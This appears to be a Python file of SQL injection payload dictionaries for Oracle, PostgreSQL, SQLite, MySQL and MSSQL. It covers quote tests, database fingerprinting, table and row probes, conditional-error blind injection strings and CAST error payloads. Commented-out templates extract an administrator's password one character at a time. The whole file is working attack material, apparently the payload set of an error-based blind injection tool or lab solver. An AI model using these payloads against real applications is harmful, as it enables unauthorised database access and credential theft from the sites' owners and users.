first_test = {
    "quote1" : "'",
    "qoute2" : "''"
}

database_fingerprinting = {
    "Oracle":      "'||(SELECT '' FROM dual)||'",
    "PostgreSQL":  "'||(SELECT '')||'",
    "SQLite":      "'||(SELECT '')||'",
    "MySQL":       "'OR(SELECT '')OR'",  
    "MSSQL":       "'+(SELECT '')+'"
}

payloads_invalid_table = {
    "Oracle":      "'||(SELECT '' FROM not_a_real_table)||'",  
    "PostgreSQL":  "'||(SELECT '' FROM not_a_real_table)||'",
    "SQLite":      "'||(SELECT '' FROM not_a_real_table)||'",
    "MySQL":       "'||(SELECT '' FROM not_a_real_table)||'",  
    "MSSQL":       "'+(SELECT '' FROM not_a_real_table)+'"
}

payloads_row_filter = {
    "Oracle":      "'||(SELECT '' FROM {row} WHERE ROWNUM = 1)||'",
    "PostgreSQL":  "'||(SELECT '' FROM {row} LIMIT 1)||'",
    "SQLite":      "'||(SELECT '' FROM {row} LIMIT 1)||'",
    "MySQL":       "'OR(SELECT '' FROM {row} LIMIT 1)OR'", 
    "MSSQL":       "'+(SELECT TOP 1 '' FROM {row})+'"
}

payloads_conditional_error = {
    "Oracle":      "'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'",
    "PostgreSQL":  "'||(SELECT CASE WHEN (1=1) THEN CAST(1/0 AS TEXT) ELSE '' END)||'",
    "SQLite":      "'||(SELECT CASE WHEN (1=1) THEN 1/0 ELSE '' END)||'",
    "MySQL":       "'||(SELECT IF(1=1, 1/0, ''))||'",  
    "MSSQL":       "'+(SELECT CASE WHEN (1=1) THEN CAST(1/0 AS NVARCHAR) ELSE '' END)+'"
}

payloads_conditional_error_false = {
    "Oracle":      "'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'",
    "PostgreSQL":  "'||(SELECT CASE WHEN (1=2) THEN CAST(1/0 AS TEXT) ELSE '' END)||'",
    "SQLite":      "'||(SELECT CASE WHEN (1=2) THEN 1/0 ELSE '' END)||'",
    "MySQL":       "'||(SELECT IF(1=2, 1/0, ''))||'", 
    "MSSQL":       "'+(SELECT CASE WHEN (1=2) THEN CAST(1/0 AS NVARCHAR) ELSE '' END)+'"
}

payloads_error_row_filter = {
    "Oracle":      "'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM {row} WHERE username='{object}')||'",
    "PostgreSQL":  "'||(SELECT CASE WHEN (1=1) THEN CAST(1/0 AS TEXT) ELSE '' END FROM {row} WHERE username='{object}')||'",
    "SQLite":      "'||(SELECT CASE WHEN (1=1) THEN 1/0 ELSE '' END FROM {row} WHERE username='{object}')||'",
    "MySQL":       "'||(SELECT IF(1=1, 1/0, '') FROM {row} WHERE username='{object}')||'",
    "MSSQL":       "'+(SELECT CASE WHEN (1=1) THEN CAST(1/0 AS NVARCHAR) ELSE '' END FROM {row} WHERE username='{object}')+"
}

# blindl = {
#     "lenght":"'||(SELECT CASE WHEN LENGTH({password})>{lenght} THEN to_char(1/0) ELSE '' END FROM {users} WHERE username='{administrator}')||'",
#     "pass_finder":"'||(SELECT CASE WHEN SUBSTR(password,{num},1)='{char}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
# }


# """

# [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]

# [a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z,0,1,2,3,4,5,6,7,8,9]


# '||(SELECT CASE WHEN SUBSTR(password,{num},1)='{char}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

# """

# cast_payloads = {
#     "MySQL": "' AND (SELECT 1)=1-- -",
#     "PostgreSQL": "' AND CAST((SELECT 1) AS int)--",
#     "SQL Server": "' AND CAST((SELECT 1 AS int))=1--",
#     "Oracle": "' AND CAST((SELECT 1 AS NUMBER))=1--",
#     "SQLite": "' AND CAST((SELECT 1) AS INTEGER)=1--"
# }

payloads_cast_select1 = {
    "PostgreSQL": "' AND CAST((SELECT 1) AS int)--",
    "SQL Server": "' AND CAST((SELECT 1) AS INT)--",
    "MySQL": "' AND CAST((SELECT 1) AS SIGNED)-- ",
    "MariaDB": "' AND CAST((SELECT 1) AS SIGNED)-- ",
    "Oracle": "' AND CAST((SELECT 1 FROM dual) AS NUMBER)--",
    "SQLite": "' AND CAST((SELECT 1) AS INTEGER)--"
}
